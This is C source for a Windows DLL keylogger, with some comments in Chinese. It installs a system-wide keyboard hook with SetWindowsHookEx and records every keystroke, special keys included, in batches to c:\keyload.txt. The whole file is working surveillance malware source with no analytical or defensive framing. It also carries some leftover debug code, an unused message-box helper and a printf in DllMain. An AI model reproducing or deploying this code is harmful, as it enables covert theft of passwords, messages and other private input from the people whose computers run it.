#include "keyhook.h"
#include <stdio.h>
#include <process.h>

#define CHARNUM 5
#define TXTLEN 10
#define SAVEFILE "c:\\keyload.txt"

static BOOL bHooked = FALSE;
static BOOL isUpper = FALSE;
static BOOL IE_is_active = FALSE;
static HHOOK hhook = 0, hhookMsg = 0;
static HINSTANCE hInst;
static int count;
static char tomb[CHARNUM];
static FILE *stream;
static int shift = 32;
short flag;

enum NUM{
    SHIFT,
    CONTROL,
    ALT,
    CAPITAL
};
static int condition[CHARNUM][CAPITAL+1];
static char text[TXTLEN];

void showMsg(int );
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){
    switch(fdwReason){
        case DLL_PROCESS_ATTACH:
            hInst = hinstDLL;
            printf("capital is %d ", CAPITAL);
            count = 0;
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        default:
            break;
    }

    return TRUE;
}


//安装钩子
DLL_EXPORT void SetKbHook(void){
    if(!bHooked){
        hhook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)KeyboardProc, hInst, (DWORD)NULL);
        bHooked = TRUE;
    }
}

//卸载钩子
DLL_EXPORT void RemoveKbHook(void){
    if(bHooked)
        UnhookWindowsHookEx(hhook);
}

//定义钩子
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam){
    int i;
    if((0x80000000 & lParam) == 0){ //keydown
        if(wParam == VK_CAPITAL){
            isUpper = !isUpper;
            return CallNextHookEx(hhook, code, wParam, lParam);
        }

        if(wParam == VK_BACK && count > 0){
            count--;
            return CallNextHookEx(hhook, code, wParam, lParam);
        }

        tomb[count] = wParam;
        count++;
    }

    if(count==CHARNUM){
        stream = fopen(SAVEFILE, "a+");

        for(i=0; i<count; i++){
            switch(tomb[i]){
                case VK_NUMLOCK:
                    fprintf(stream, "%s", "<NUM>");
                    break;
                case VK_LWIN:
                    fprintf(stream, "%s", "<LWin>");
                    break;
                case VK_RWIN:
                    fprintf(stream, "%s", "<Rwin>");
                    break;
                case VK_F1:
                    fprintf(stream, "%s", "<F1>");
                    break;
                case VK_F2:
                    fprintf(stream, "%s", "<F2>");
                    break;
                case VK_F3:
                    fprintf(stream, "%s", "<F3>");
                    break;
                case VK_F4:
                    fprintf(stream, "%s", "<F4>");
                    break;
                case VK_F5:
                    fprintf(stream, "%s", "<F5>");
                    break;
                case VK_F6:
                    fprintf(stream, "%s", "<F6>");
                    break;
                case VK_F7:
                    fprintf(stream, "%s", "<F7>");
                    break;
                case VK_F8:
                    fprintf(stream, "%s", "<F8>");
                    break;
                case VK_F9:
                    fprintf(stream, "%s", "<F9>");
                    break;
                case VK_F10:
                    fprintf(stream, "%s", "<F10>");
                    break;
                case VK_F11:
                    fprintf(stream, "%s", "<F11>");
                    break;
                case VK_F12:
                    fprintf(stream, "%s", "<F12>");
                    break;
                case VK_TAB:
                    fprintf(stream, "%s", "<Tab>");
                    break;
                case VK_ESCAPE:
                    fprintf(stream, "%s", "<Esc>");
                    break;
                case VK_LEFT:
                    fprintf(stream, "%s", " <- ");
                    break;
                case VK_RIGHT:
                    fprintf(stream, "%s", " -> ");
                    break;
                case VK_UP:
                    fprintf(stream, "%s", " [^] ");
                    break;
                case VK_DOWN:
                    fprintf(stream, "%s", " [v] ");
                    break;
                case VK_END:
                    fprintf(stream, "%s", "<End>");
                    break;
                case VK_HOME:
                    fprintf(stream, "%s", "<Home>");
                    break;
                case VK_PRIOR:
                    fprintf(stream, "%s", "<Prio>");
                    break;
                case VK_NEXT:
                    fprintf(stream, "%s", "<Next>");
                    break;
                case VK_INSERT:
                    fprintf(stream, "%s", "<Ins>");
                    break;
                case VK_SCROLL:
                    fprintf(stream, "%s", "<Scr>");
                    break;
                case VK_PAUSE:
                    fprintf(stream, "%s", "<Pau>");
                    break;
                case VK_DELETE:
                    fprintf(stream, "%s", "<Del>");
                    break;
                case VK_RETURN:
                    fprintf(stream, "%s", "<CR>");
                    break;
                case VK_SHIFT:
                    fprintf(stream, "%s", "<Shift>");
                    break;
                case VK_BACK:
                    fprintf(stream, "%s", "<Del>");
                    break;
                case VK_CONTROL:
                    fprintf(stream, "%s", "<Ctl>");
                    break;
                case VK_MENU:
                    fprintf(stream, "%s", "<Alt>");
                    break;
                default:
                    if(tomb[i] >= 0x41 && tomb[i] <= 0x5a && !isUpper) //letter
                        tomb[i] = tomb[i] + 32;
                    fprintf(stream, "%c", tomb[i]);
                    break;
            }
        }

        fprintf(stream, "%s", "\r\n");
        fclose(stream);
        count = 0;
    }
    return CallNextHookEx(hhook, code, wParam, lParam);
}

void showMsg(int digit){
    char text[3];
    if(digit >= 0x20 && digit <= 0x7e){
        if(digit >= 0x41 && digit <= 0x5a){ //letter
            if(isUpper)
                text[0] = digit;
            else
                text[0] = digit + 32;
        }
        else
            text[0] = digit;

        text[1] = '\0';
        MessageBox(GetDesktopWindow(), text, "hello", MB_OK);
    }else{
        itoa(digit, text, 10);
        MessageBox(GetDesktopWindow(), text, "hello", MB_OK);
    }
}

void Initcondition(void){
    int i, j;

    for(i=0; i<CHARNUM; i++)
        for(j=0; j<CAPITAL; j++)
            condition[i][j] = 0;
}
